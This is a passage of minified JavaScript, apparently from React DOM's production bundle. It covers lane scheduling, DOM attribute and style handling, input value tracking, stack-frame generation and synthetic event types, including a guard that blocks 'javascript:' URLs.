      case 4194304:
      case 8388608:
      case 16777216:
      case 33554432:
        return t & 62914560;
      case 67108864:
        return 67108864;
      case 134217728:
        return 134217728;
      case 268435456:
        return 268435456;
      case 536870912:
        return 536870912;
      case 1073741824:
        return 0;
      default:
        return t
    }
  }
  function ma(t, e, l) {
    var a = t.pendingLanes;
    if (a === 0)
      return 0;
    var n = 0
      , i = t.suspendedLanes
      , u = t.pingedLanes;
    t = t.warmLanes;
    var s = a & 134217727;
    return s !== 0 ? (a = s & ~i,
      a !== 0 ? n = ul(a) : (u &= s,
        u !== 0 ? n = ul(u) : l || (l = s & ~t,
          l !== 0 && (n = ul(l))))) : (s = a & ~i,
            s !== 0 ? n = ul(s) : u !== 0 ? n = ul(u) : l || (l = a & ~t,
              l !== 0 && (n = ul(l)))),
      n === 0 ? 0 : e !== 0 && e !== n && (e & i) === 0 && (i = n & -n,
        l = e & -e,
        i >= l || i === 32 && (l & 4194048) !== 0) ? e : n
  }
  function Ul(t, e) {
    return (t.pendingLanes & ~(t.suspendedLanes & ~t.pingedLanes) & e) === 0
  }
  function qa(t, e) {
    switch (t) {
      case 1:
      case 2:
      case 4:
      case 8:
      case 64:
        return e + 250;
      case 16:
      case 32:
      case 128:
      case 256:
      case 512:
      case 1024:
      case 2048:
      case 4096:
      case 8192:
      case 16384:
      case 32768:
      case 65536:
      case 131072:
      case 262144:
      case 524288:
      case 1048576:
      case 2097152:
        return e + 5e3;
      case 4194304:
      case 8388608:
      case 16777216:
      case 33554432:
        return -1;
      case 67108864:
      case 134217728:
      case 268435456:
      case 536870912:
      case 1073741824:
        return -1;
      default:
        return -1
    }
  }
  function zi() {
    var t = wa;
    return wa <<= 1,
      (wa & 4194048) === 0 && (wa = 256),
      t
  }
  function Sn() {
    var t = Ha;
    return Ha <<= 1,
      (Ha & 62914560) === 0 && (Ha = 4194304),
      t
  }
  function zn(t) {
    for (var e = [], l = 0; 31 > l; l++)
      e.push(t);
    return e
  }
  function cl(t, e) {
    t.pendingLanes |= e,
      e !== 268435456 && (t.suspendedLanes = 0,
        t.pingedLanes = 0,
        t.warmLanes = 0)
  }
  function Xu(t, e, l, a, n, i) {
    var u = t.pendingLanes;
    t.pendingLanes = l,
      t.suspendedLanes = 0,
      t.pingedLanes = 0,
      t.warmLanes = 0,
      t.expiredLanes &= l,
      t.entangledLanes &= l,
      t.errorRecoveryDisabledLanes &= l,
      t.shellSuspendCounter = 0;
    var s = t.entanglements
      , f = t.expirationTimes
      , x = t.hiddenUpdates;
    for (l = u & ~l; 0 < l;) {
      var _ = 31 - fe(l)
        , M = 1 << _;
      s[_] = 0,
        f[_] = -1;
      var z = x[_];
      if (z !== null)
        for (x[_] = null,
          _ = 0; _ < z.length; _++) {
          var N = z[_];
          N !== null && (N.lane &= -536870913)
        }
      l &= ~M
    }
    a !== 0 && pa(t, a, 0),
      i !== 0 && n === 0 && t.tag !== 0 && (t.suspendedLanes |= i & ~(u & ~e))
  }
  function pa(t, e, l) {
    t.pendingLanes |= e,
      t.suspendedLanes &= ~e;
    var a = 31 - fe(e);
    t.entangledLanes |= e,
      t.entanglements[a] = t.entanglements[a] | 1073741824 | l & 4194090
  }
  function wl(t, e) {
    var l = t.entangledLanes |= e;
    for (t = t.entanglements; l;) {
      var a = 31 - fe(l)
        , n = 1 << a;
      n & e | t[a] & e && (t[a] |= e),
        l &= ~n
    }
  }
  function Hl(t) {
    switch (t) {
      case 2:
        t = 1;
        break;
      case 8:
        t = 4;
        break;
      case 32:
        t = 16;
        break;
      case 256:
      case 512:
      case 1024:
      case 2048:
      case 4096:
      case 8192:
      case 16384:
      case 32768:
      case 65536:
      case 131072:
      case 262144:
      case 524288:
      case 1048576:
      case 2097152:
      case 4194304:
      case 8388608:
      case 16777216:
      case 33554432:
        t = 128;
        break;
      case 268435456:
        t = 134217728;
        break;
      default:
        t = 0
    }
    return t
  }
  function Nn(t) {
    return t &= -t,
      2 < t ? 8 < t ? (t & 134217727) !== 0 ? 32 : 268435456 : 8 : 2
  }
  function Ni() {
    var t = w.p;
    return t !== 0 ? t : (t = window.event,
      t === void 0 ? 32 : Gd(t.type))
  }
  function Ba(t, e) {
    var l = w.p;
    try {
      return w.p = t,
        e()
    } finally {
      w.p = l
    }
  }
  var sl = Math.random().toString(36).slice(2)
    , ie = "__reactFiber$" + sl
    , ge = "__reactProps$" + sl
    , ql = "__reactContainer$" + sl
    , Tn = "__reactEvents$" + sl
    , Ti = "__reactListeners$" + sl
    , Qu = "__reactHandles$" + sl
    , $t = "__reactResources$" + sl
    , Bl = "__reactMarker$" + sl;
  function ha(t) {
    delete t[ie],
      delete t[ge],
      delete t[Tn],
      delete t[Ti],
      delete t[Qu]
  }
  function Yl(t) {
    var e = t[ie];
    if (e)
      return e;
    for (var l = t.parentNode; l;) {
      if (e = l[ql] || l[ie]) {
        if (l = e.alternate,
          e.child !== null || l !== null && l.child !== null)
          for (t = Ed(t); t !== null;) {
            if (l = t[ie])
              return l;
            t = Ed(t)
          }
        return e
      }
      t = l,
        l = t.parentNode
    }
    return null
  }
  function Gl(t) {
    if (t = t[ie] || t[ql]) {
      var e = t.tag;
      if (e === 5 || e === 6 || e === 13 || e === 26 || e === 27 || e === 3)
        return t
    }
    return null
  }
  function d(t) {
    var e = t.tag;
    if (e === 5 || e === 26 || e === 27 || e === 6)
      return t.stateNode;
    throw Error(r(33))
  }
  function U(t) {
    var e = t[$t];
    return e || (e = t[$t] = {
      hoistableStyles: new Map,
      hoistableScripts: new Map
    }),
      e
  }
  function H(t) {
    t[Bl] = !0
  }
  var j = new Set
    , Y = {};
  function F(t, e) {
    ft(t, e),
      ft(t + "Capture", e)
  }
  function ft(t, e) {
    for (Y[t] = e,
      t = 0; t < e.length; t++)
      j.add(e[t])
  }
  var bt = RegExp("^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$")
    , I = {}
    , et = {};
  function at(t) {
    return ll.call(et, t) ? !0 : ll.call(I, t) ? !1 : bt.test(t) ? et[t] = !0 : (I[t] = !0,
      !1)
  }
  function ut(t, e, l) {
    if (at(e))
      if (l === null)
        t.removeAttribute(e);
      else {
        switch (typeof l) {
          case "undefined":
          case "function":
          case "symbol":
            t.removeAttribute(e);
            return;
          case "boolean":
            var a = e.toLowerCase().slice(0, 5);
            if (a !== "data-" && a !== "aria-") {
              t.removeAttribute(e);
              return
            }
        }
        t.setAttribute(e, "" + l)
      }
  }
  function te(t, e, l) {
    if (l === null)
      t.removeAttribute(e);
    else {
      switch (typeof l) {
        case "undefined":
        case "function":
        case "symbol":
        case "boolean":
          t.removeAttribute(e);
          return
      }
      t.setAttribute(e, "" + l)
    }
  }
  function ee(t, e, l, a) {
    if (a === null)
      t.removeAttribute(l);
    else {
      switch (typeof a) {
        case "undefined":
        case "function":
        case "symbol":
        case "boolean":
          t.removeAttribute(l);
          return
      }
      t.setAttributeNS(e, l, "" + a)
    }
  }
  var bl, Et;
  function Ae(t) {
    if (bl === void 0)
      try {
        throw Error()
      } catch (l) {
        var e = l.stack.trim().match(/\n( *(at )?)/);
        bl = e && e[1] || "",
          Et = -1 < l.stack.indexOf(`
    at`) ? " (<anonymous>)" : -1 < l.stack.indexOf("@") ? "@unknown:0:0" : ""
      }
    return `
` + bl + t + Et
  }
  var Ie = !1;
  function Lu(t, e) {
    if (!t || Ie)
      return "";
    Ie = !0;
    var l = Error.prepareStackTrace;
    Error.prepareStackTrace = void 0;
    try {
      var a = {
        DetermineComponentFrameRoot: function () {
          try {
            if (e) {
              var M = function () {
                throw Error()
              };
              if (Object.defineProperty(M.prototype, "props", {
                set: function () {
                  throw Error()
                }
              }),
                typeof Reflect == "object" && Reflect.construct) {
                try {
                  Reflect.construct(M, [])
                } catch (N) {
                  var z = N
                }
                Reflect.construct(t, [], M)
              } else {
                try {
                  M.call()
                } catch (N) {
                  z = N
                }
                t.call(M.prototype)
              }
            } else {
              try {
                throw Error()
              } catch (N) {
                z = N
              }
              (M = t()) && typeof M.catch == "function" && M.catch(function () { })
            }
          } catch (N) {
            if (N && z && typeof N.stack == "string")
              return [N.stack, z.stack]
          }
          return [null, null]
        }
      };
      a.DetermineComponentFrameRoot.displayName = "DetermineComponentFrameRoot";
      var n = Object.getOwnPropertyDescriptor(a.DetermineComponentFrameRoot, "name");
      n && n.configurable && Object.defineProperty(a.DetermineComponentFrameRoot, "name", {
        value: "DetermineComponentFrameRoot"
      });
      var i = a.DetermineComponentFrameRoot()
        , u = i[0]
        , s = i[1];
      if (u && s) {
        var f = u.split(`
`)
          , x = s.split(`
`);
        for (n = a = 0; a < f.length && !f[a].includes("DetermineComponentFrameRoot");)
          a++;
        for (; n < x.length && !x[n].includes("DetermineComponentFrameRoot");)
          n++;
        if (a === f.length || n === x.length)
          for (a = f.length - 1,
            n = x.length - 1; 1 <= a && 0 <= n && f[a] !== x[n];)
            n--;
        for (; 1 <= a && 0 <= n; a--,
          n--)
          if (f[a] !== x[n]) {
            if (a !== 1 || n !== 1)
              do
                if (a--,
                  n--,
                  0 > n || f[a] !== x[n]) {
                  var _ = `
` + f[a].replace(" at new ", " at ");
                  return t.displayName && _.includes("<anonymous>") && (_ = _.replace("<anonymous>", t.displayName)),
                    _
                }
              while (1 <= a && 0 <= n);
            break
          }
      }
    } finally {
      Ie = !1,
        Error.prepareStackTrace = l
    }
    return (l = t ? t.displayName || t.name : "") ? Ae(l) : ""
  }
  function Y0(t) {
    switch (t.tag) {
      case 26:
      case 27:
      case 5:
        return Ae(t.type);
      case 16:
        return Ae("Lazy");
      case 13:
        return Ae("Suspense");
      case 19:
        return Ae("SuspenseList");
      case 0:
      case 15:
        return Lu(t.type, !1);
      case 11:
        return Lu(t.type.render, !1);
      case 1:
        return Lu(t.type, !0);
      case 31:
        return Ae("Activity");
      default:
        return ""
    }
  }
  function mr(t) {
    try {
      var e = "";
      do
        e += Y0(t),
          t = t.return;
      while (t);
      return e
    } catch (l) {
      return `
Error generating stack: ` + l.message + `
` + l.stack
    }
  }
  function Ye(t) {
    switch (typeof t) {
      case "bigint":
      case "boolean":
      case "number":
      case "string":
      case "undefined":
        return t;
      case "object":
        return t;
      default:
        return ""
    }
  }
  function pr(t) {
    var e = t.type;
    return (t = t.nodeName) && t.toLowerCase() === "input" && (e === "checkbox" || e === "radio")
  }
  function G0(t) {
    var e = pr(t) ? "checked" : "value"
      , l = Object.getOwnPropertyDescriptor(t.constructor.prototype, e)
      , a = "" + t[e];
    if (!t.hasOwnProperty(e) && typeof l < "u" && typeof l.get == "function" && typeof l.set == "function") {
      var n = l.get
        , i = l.set;
      return Object.defineProperty(t, e, {
        configurable: !0,
        get: function () {
          return n.call(this)
        },
        set: function (u) {
          a = "" + u,
            i.call(this, u)
        }
      }),
        Object.defineProperty(t, e, {
          enumerable: l.enumerable
        }),
      {
        getValue: function () {
          return a
        },
        setValue: function (u) {
          a = "" + u
        },
        stopTracking: function () {
          t._valueTracker = null,
            delete t[e]
        }
      }
    }
  }
  function _i(t) {
    t._valueTracker || (t._valueTracker = G0(t))
  }
  function hr(t) {
    if (!t)
      return !1;
    var e = t._valueTracker;
    if (!e)
      return !0;
    var l = e.getValue()
      , a = "";
    return t && (a = pr(t) ? t.checked ? "true" : "false" : t.value),
      t = a,
      t !== l ? (e.setValue(t),
        !0) : !1
  }
  function Ei(t) {
    if (t = t || (typeof document < "u" ? document : void 0),
      typeof t > "u")
      return null;
    try {
      return t.activeElement || t.body
    } catch {
      return t.body
    }
  }
  var X0 = /[\n"\\]/g;
  function Ge(t) {
    return t.replace(X0, function (e) {
      return "\\" + e.charCodeAt(0).toString(16) + " "
    })
  }
  function Zu(t, e, l, a, n, i, u, s) {
    t.name = "",
      u != null && typeof u != "function" && typeof u != "symbol" && typeof u != "boolean" ? t.type = u : t.removeAttribute("type"),
      e != null ? u === "number" ? (e === 0 && t.value === "" || t.value != e) && (t.value = "" + Ye(e)) : t.value !== "" + Ye(e) && (t.value = "" + Ye(e)) : u !== "submit" && u !== "reset" || t.removeAttribute("value"),
      e != null ? Vu(t, u, Ye(e)) : l != null ? Vu(t, u, Ye(l)) : a != null && t.removeAttribute("value"),
      n == null && i != null && (t.defaultChecked = !!i),
      n != null && (t.checked = n && typeof n != "function" && typeof n != "symbol"),
      s != null && typeof s != "function" && typeof s != "symbol" && typeof s != "boolean" ? t.name = "" + Ye(s) : t.removeAttribute("name")
  }
  function gr(t, e, l, a, n, i, u, s) {
    if (i != null && typeof i != "function" && typeof i != "symbol" && typeof i != "boolean" && (t.type = i),
      e != null || l != null) {
      if (!(i !== "submit" && i !== "reset" || e != null))
        return;
      l = l != null ? "" + Ye(l) : "",
        e = e != null ? "" + Ye(e) : l,
        s || e === t.value || (t.value = e),
        t.defaultValue = e
    }
    a = a ?? n,
      a = typeof a != "function" && typeof a != "symbol" && !!a,
      t.checked = s ? t.checked : !!a,
      t.defaultChecked = !!a,
      u != null && typeof u != "function" && typeof u != "symbol" && typeof u != "boolean" && (t.name = u)
  }
  function Vu(t, e, l) {
    e === "number" && Ei(t.ownerDocument) === t || t.defaultValue === "" + l || (t.defaultValue = "" + l)
  }
  function Ya(t, e, l, a) {
    if (t = t.options,
      e) {
      e = {};
      for (var n = 0; n < l.length; n++)
        e["$" + l[n]] = !0;
      for (l = 0; l < t.length; l++)
        n = e.hasOwnProperty("$" + t[l].value),
          t[l].selected !== n && (t[l].selected = n),
          n && a && (t[l].defaultSelected = !0)
    } else {
      for (l = "" + Ye(l),
        e = null,
        n = 0; n < t.length; n++) {
        if (t[n].value === l) {
          t[n].selected = !0,
            a && (t[n].defaultSelected = !0);
          return
        }
        e !== null || t[n].disabled || (e = t[n])
      }
      e !== null && (e.selected = !0)
    }
  }
  function vr(t, e, l) {
    if (e != null && (e = "" + Ye(e),
      e !== t.value && (t.value = e),
      l == null)) {
      t.defaultValue !== e && (t.defaultValue = e);
      return
    }
    t.defaultValue = l != null ? "" + Ye(l) : ""
  }
  function br(t, e, l, a) {
    if (e == null) {
      if (a != null) {
        if (l != null)
          throw Error(r(92));
        if (qt(a)) {
          if (1 < a.length)
            throw Error(r(93));
          a = a[0]
        }
        l = a
      }
      l == null && (l = ""),
        e = l
    }
    l = Ye(e),
      t.defaultValue = l,
      a = t.textContent,
      a === l && a !== "" && a !== null && (t.value = a)
  }
  function Ga(t, e) {
    if (e) {
      var l = t.firstChild;
      if (l && l === t.lastChild && l.nodeType === 3) {
        l.nodeValue = e;
        return
      }
    }
    t.textContent = e
  }
  var Q0 = new Set("animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(" "));
  function yr(t, e, l) {
    var a = e.indexOf("--") === 0;
    l == null || typeof l == "boolean" || l === "" ? a ? t.setProperty(e, "") : e === "float" ? t.cssFloat = "" : t[e] = "" : a ? t.setProperty(e, l) : typeof l != "number" || l === 0 || Q0.has(e) ? e === "float" ? t.cssFloat = l : t[e] = ("" + l).trim() : t[e] = l + "px"
  }
  function xr(t, e, l) {
    if (e != null && typeof e != "object")
      throw Error(r(62));
    if (t = t.style,
      l != null) {
      for (var a in l)
        !l.hasOwnProperty(a) || e != null && e.hasOwnProperty(a) || (a.indexOf("--") === 0 ? t.setProperty(a, "") : a === "float" ? t.cssFloat = "" : t[a] = "");
      for (var n in e)
        a = e[n],
          e.hasOwnProperty(n) && l[n] !== a && yr(t, n, a)
    } else
      for (var i in e)
        e.hasOwnProperty(i) && yr(t, i, e[i])
  }
  function Ku(t) {
    if (t.indexOf("-") === -1)
      return !1;
    switch (t) {
      case "annotation-xml":
      case "color-profile":
      case "font-face":
      case "font-face-src":
      case "font-face-uri":
      case "font-face-format":
      case "font-face-name":
      case "missing-glyph":
        return !1;
      default:
        return !0
    }
  }
  var L0 = new Map([["acceptCharset", "accept-charset"], ["htmlFor", "for"], ["httpEquiv", "http-equiv"], ["crossOrigin", "crossorigin"], ["accentHeight", "accent-height"], ["alignmentBaseline", "alignment-baseline"], ["arabicForm", "arabic-form"], ["baselineShift", "baseline-shift"], ["capHeight", "cap-height"], ["clipPath", "clip-path"], ["clipRule", "clip-rule"], ["colorInterpolation", "color-interpolation"], ["colorInterpolationFilters", "color-interpolation-filters"], ["colorProfile", "color-profile"], ["colorRendering", "color-rendering"], ["dominantBaseline", "dominant-baseline"], ["enableBackground", "enable-background"], ["fillOpacity", "fill-opacity"], ["fillRule", "fill-rule"], ["floodColor", "flood-color"], ["floodOpacity", "flood-opacity"], ["fontFamily", "font-family"], ["fontSize", "font-size"], ["fontSizeAdjust", "font-size-adjust"], ["fontStretch", "font-stretch"], ["fontStyle", "font-style"], ["fontVariant", "font-variant"], ["fontWeight", "font-weight"], ["glyphName", "glyph-name"], ["glyphOrientationHorizontal", "glyph-orientation-horizontal"], ["glyphOrientationVertical", "glyph-orientation-vertical"], ["horizAdvX", "horiz-adv-x"], ["horizOriginX", "horiz-origin-x"], ["imageRendering", "image-rendering"], ["letterSpacing", "letter-spacing"], ["lightingColor", "lighting-color"], ["markerEnd", "marker-end"], ["markerMid", "marker-mid"], ["markerStart", "marker-start"], ["overlinePosition", "overline-position"], ["overlineThickness", "overline-thickness"], ["paintOrder", "paint-order"], ["panose-1", "panose-1"], ["pointerEvents", "pointer-events"], ["renderingIntent", "rendering-intent"], ["shapeRendering", "shape-rendering"], ["stopColor", "stop-color"], ["stopOpacity", "stop-opacity"], ["strikethroughPosition", "strikethrough-position"], ["strikethroughThickness", "strikethrough-thickness"], ["strokeDasharray", "stroke-dasharray"], ["strokeDashoffset", "stroke-dashoffset"], ["strokeLinecap", "stroke-linecap"], ["strokeLinejoin", "stroke-linejoin"], ["strokeMiterlimit", "stroke-miterlimit"], ["strokeOpacity", "stroke-opacity"], ["strokeWidth", "stroke-width"], ["textAnchor", "text-anchor"], ["textDecoration", "text-decoration"], ["textRendering", "text-rendering"], ["transformOrigin", "transform-origin"], ["underlinePosition", "underline-position"], ["underlineThickness", "underline-thickness"], ["unicodeBidi", "unicode-bidi"], ["unicodeRange", "unicode-range"], ["unitsPerEm", "units-per-em"], ["vAlphabetic", "v-alphabetic"], ["vHanging", "v-hanging"], ["vIdeographic", "v-ideographic"], ["vMathematical", "v-mathematical"], ["vectorEffect", "vector-effect"], ["vertAdvY", "vert-adv-y"], ["vertOriginX", "vert-origin-x"], ["vertOriginY", "vert-origin-y"], ["wordSpacing", "word-spacing"], ["writingMode", "writing-mode"], ["xmlnsXlink", "xmlns:xlink"], ["xHeight", "x-height"]])
    , Z0 = /^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;
  function Ai(t) {
    return Z0.test("" + t) ? "javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')" : t
  }
  var Ju = null;
  function $u(t) {
    return t = t.target || t.srcElement || window,
      t.correspondingUseElement && (t = t.correspondingUseElement),
      t.nodeType === 3 ? t.parentNode : t
  }
  var Xa = null
    , Qa = null;
  function Sr(t) {
    var e = Gl(t);
    if (e && (t = e.stateNode)) {
      var l = t[ge] || null;
      t: switch (t = e.stateNode,
      e.type) {
        case "input":
          if (Zu(t, l.value, l.defaultValue, l.defaultValue, l.checked, l.defaultChecked, l.type, l.name),
            e = l.name,
            l.type === "radio" && e != null) {
            for (l = t; l.parentNode;)
              l = l.parentNode;
            for (l = l.querySelectorAll('input[name="' + Ge("" + e) + '"][type="radio"]'),
              e = 0; e < l.length; e++) {
              var a = l[e];
              if (a !== t && a.form === t.form) {
                var n = a[ge] || null;
                if (!n)
                  throw Error(r(90));
                Zu(a, n.value, n.defaultValue, n.defaultValue, n.checked, n.defaultChecked, n.type, n.name)
              }
            }
            for (e = 0; e < l.length; e++)
              a = l[e],
                a.form === t.form && hr(a)
          }
          break t;
        case "textarea":
          vr(t, l.value, l.defaultValue);
          break t;
        case "select":
          e = l.value,
            e != null && Ya(t, !!l.multiple, e, !1)
      }
    }
  }
  var Wu = !1;
  function zr(t, e, l) {
    if (Wu)
      return t(e, l);
    Wu = !0;
    try {
      var a = t(e);
      return a
    } finally {
      if (Wu = !1,
        (Xa !== null || Qa !== null) && (du(),
          Xa && (e = Xa,
            t = Qa,
            Qa = Xa = null,
            Sr(e),
            t)))
        for (e = 0; e < t.length; e++)
          Sr(t[e])
    }
  }
  function _n(t, e) {
    var l = t.stateNode;
    if (l === null)
      return null;
    var a = l[ge] || null;
    if (a === null)
      return null;
    l = a[e];
    t: switch (e) {
      case "onClick":
      case "onClickCapture":
      case "onDoubleClick":
      case "onDoubleClickCapture":
      case "onMouseDown":
      case "onMouseDownCapture":
      case "onMouseMove":
      case "onMouseMoveCapture":
      case "onMouseUp":
      case "onMouseUpCapture":
      case "onMouseEnter":
        (a = !a.disabled) || (t = t.type,
          a = !(t === "button" || t === "input" || t === "select" || t === "textarea")),
          t = !a;
        break t;
      default:
        t = !1
    }
    if (t)
      return null;
    if (l && typeof l != "function")
      throw Error(r(231, e, typeof l));
    return l
  }
  var yl = !(typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u")
    , Fu = !1;
  if (yl)
    try {
      var En = {};
      Object.defineProperty(En, "passive", {
        get: function () {
          Fu = !0
        }
      }),
        window.addEventListener("test", En, En),
        window.removeEventListener("test", En, En)
    } catch {
      Fu = !1
    }
  var Xl = null
    , Iu = null
    , Mi = null;
  function Nr() {
    if (Mi)
      return Mi;
    var t, e = Iu, l = e.length, a, n = "value" in Xl ? Xl.value : Xl.textContent, i = n.length;
    for (t = 0; t < l && e[t] === n[t]; t++)
      ;
    var u = l - t;
    for (a = 1; a <= u && e[l - a] === n[i - a]; a++)
      ;
    return Mi = n.slice(t, 1 < a ? 1 - a : void 0)
  }
  function Oi(t) {
    var e = t.keyCode;
    return "charCode" in t ? (t = t.charCode,
      t === 0 && e === 13 && (t = 13)) : t = e,
      t === 10 && (t = 13),
      32 <= t || t === 13 ? t : 0
  }
  function Ri() {
    return !0
  }
  function Tr() {
    return !1
  }
  function Me(t) {
    function e(l, a, n, i, u) {
      this._reactName = l,
        this._targetInst = n,
        this.type = a,
        this.nativeEvent = i,
        this.target = u,
        this.currentTarget = null;
      for (var s in t)
        t.hasOwnProperty(s) && (l = t[s],
          this[s] = l ? l(i) : i[s]);
      return this.isDefaultPrevented = (i.defaultPrevented != null ? i.defaultPrevented : i.returnValue === !1) ? Ri : Tr,
        this.isPropagationStopped = Tr,
        this
    }
    return C(e.prototype, {
      preventDefault: function () {
        this.defaultPrevented = !0;
        var l = this.nativeEvent;
        l && (l.preventDefault ? l.preventDefault() : typeof l.returnValue != "unknown" && (l.returnValue = !1),
          this.isDefaultPrevented = Ri)
      },
      stopPropagation: function () {
        var l = this.nativeEvent;
        l && (l.stopPropagation ? l.stopPropagation() : typeof l.cancelBubble != "unknown" && (l.cancelBubble = !0),
          this.isPropagationStopped = Ri)
      },
      persist: function () { },
      isPersistent: Ri
    }),
      e
  }
  var ga = {
    eventPhase: 0,
    bubbles: 0,
    cancelable: 0,
    timeStamp: function (t) {
      return t.timeStamp || Date.now()
    },
    defaultPrevented: 0,
    isTrusted: 0
  }, ki = Me(ga), An = C({}, ga, {
    view: 0,
    detail: 0
  }), V0 = Me(An), Pu, tc, Mn, ji = C({}, An, {
    screenX: 0,
    screenY: 0,
    clientX: 0,
    clientY: 0,
    pageX: 0,
    pageY: 0,
    ctrlKey: 0,
    shiftKey: 0,
    altKey: 0,
    metaKey: 0,
    getModifierState: lc,
    button: 0,
    buttons: 0,
    relatedTarget: function (t) {
      return t.relatedTarget === void 0 ? t.fromElement === t.srcElement ? t.toElement : t.fromElement : t.relatedTarget
    },
    movementX: function (t) {
      return "movementX" in t ? t.movementX : (t !== Mn && (Mn && t.type === "mousemove" ? (Pu = t.screenX - Mn.screenX,
        tc = t.screenY - Mn.screenY) : tc = Pu = 0,
        Mn = t),
        Pu)
    },
    movementY: function (t) {
      return "movementY" in t ? t.movementY : tc
    }
  }), _r = Me(ji), K0 = C({}, ji, {
    dataTransfer: 0
  }), J0 = Me(K0), $0 = C({}, An, {
    relatedTarget: 0
  }), ec = Me($0), W0 = C({}, ga, {
    animationName: 0,
    elapsedTime: 0,
    pseudoElement: 0
  }), F0 = Me(W0), I0 = C({}, ga, {
    clipboardData: function (t) {
      return "clipboardData" in t ? t.clipboardData : window.clipboardData
    }
  }), P0 = Me(I0), tm = C({}, ga, {
    data: 0
  }), Er = Me(tm), em = {
    Esc: "Escape",
    Spacebar: " ",
    Left: "ArrowLeft",
    Up: "ArrowUp",
    Right: "ArrowRight",
    Down: "ArrowDown",
    Del: "Delete",
    Win: "OS",
    Menu: "ContextMenu",
    Apps: "ContextMenu",
    Scroll: "ScrollLock",
    MozPrintableKey: "Unidentified"
  }, lm = {
    8: "Backspace",
    9: "Tab",
    12: "Clear",
    13: "Enter",
    16: "Shift",
    17: "Control",
    18: "Alt",
    19: "Pause",
    20: "CapsLock",
    27: "Escape",
    32: " ",
    33: "PageUp",
    34: "PageDown",
    35: "End",
    36: "Home",
    37: "ArrowLeft",
    38: "ArrowUp",
    39: "ArrowRight",
    40: "ArrowDown",
    45: "Insert",
    46: "Delete",
    112: "F1",
    113: "F2",
    114: "F3",
    115: "F4",
    116: "F5",
    117: "F6",
    118: "F7",
    119: "F8",
    120: "F9",
    121: "F10",
    122: "F11",
    123: "F12",
    144: "NumLock",
    145: "ScrollLock",
    224: "Meta"
  }, am = {
    Alt: "altKey",
    Control: "ctrlKey",
    Meta: "metaKey",
    Shift: "shiftKey"
  };
  function nm(t) {
    var e = this.nativeEvent;
    return e.getModifierState ? e.getModifierState(t) : (t = am[t]) ? !!e[t] : !1
  }
  function lc() {
    return nm
  }
  var im = C({}, An, {
    key: function (t) {
      if (t.key) {
        var e = em[t.key] || t.key;
        if (e !== "Unidentified")
          return e
      }
      return t.type === "keypress" ? (t = Oi(t),
        t === 13 ? "Enter" : String.fromCharCode(t)) : t.type === "keydown" || t.type === "keyup" ? lm[t.keyCode] || "Unidentified" : ""
    },
    code: 0,
    location: 0,
    ctrlKey: 0,
    shiftKey: 0,
    altKey: 0,
    metaKey: 0,
    repeat: 0,
    locale: 0,
    getModifierState: lc,
    charCode: function (t) {
      return t.type === "keypress" ? Oi(t) : 0
    },
    keyCode: function (t) {
      return t.type === "keydown" || t.type === "keyup" ? t.keyCode : 0
    },
    which: function (t) {
      return t.type === "keypress" ? Oi(t) : t.type === "keydown" || t.type === "keyup" ? t.keyCode : 0
    }
  })
    , um = Me(im)
    , cm = C({}, ji, {
      pointerId: 0,
      width: 0,
      height: 0,
      pressure: 0,
      tangentialPressure: 0,
      tiltX: 0,
      tiltY: 0,
      twist: 0,
      pointerType: 0,
      isPrimary: 0
    })
    , Ar = Me(cm)
    , sm = C({}, An, {
      touches: 0,
      targetTouches: 0,
      changedTouches: 0,
      altKey: 0,
      metaKey: 0,
      ctrlKey: 0,
      shiftKey: 0,
      getModifierState: lc
    })
    , rm = Me(sm)
    , om = C({}, ga, {
      propertyName: 0,
      elapsedTime: 0,
      pseudoElement: 0
    })
    , fm = Me(om)
    , dm = C({}, ji, {
      deltaX: function (t) {
        return "deltaX" in t ? t.deltaX : "wheelDeltaX" in t ? -t.wheelDeltaX : 0
      },
      deltaY: function (t) {
        return "deltaY" in t ? t.deltaY : "wheelDeltaY" in t ? -t.wheelDeltaY : "wheelDelta" in t ? -t.wheelDelta : 0
      },
      deltaZ: 0,
      deltaMode: 0
    })
    , mm = Me(dm)
    , pm = C({}, ga, {
      newState: 0,
      oldState: 0
    })
    , hm = Me(pm)
    , gm = [9, 13, 27, 32]
    , ac = yl && "CompositionEvent" in window
    , On = null;
  yl && "documentMode" in document && (On = document.documentMode);
  var vm = yl && "TextEvent" in window && !On
    , Mr = yl && (!ac || On && 8 < On && 11 >= On)
    , Or = " "
    , Rr = !1;
  function kr(t, e) {
    switch (t) {
      case "keyup":
        return gm.indexOf(e.keyCode) !== -1;
      case "keydown":
        return e.keyCode !== 229;
      case "keypress":
      case "mousedown":
      case "focusout":
        return !0;
      default:
        return !1
    }
  }
  function jr(t) {
    return t = t.detail,
      typeof t == "object" && "data" in t ? t.data : null
  }
  var La = !1;
  function bm(t, e) {
    switch (t) {
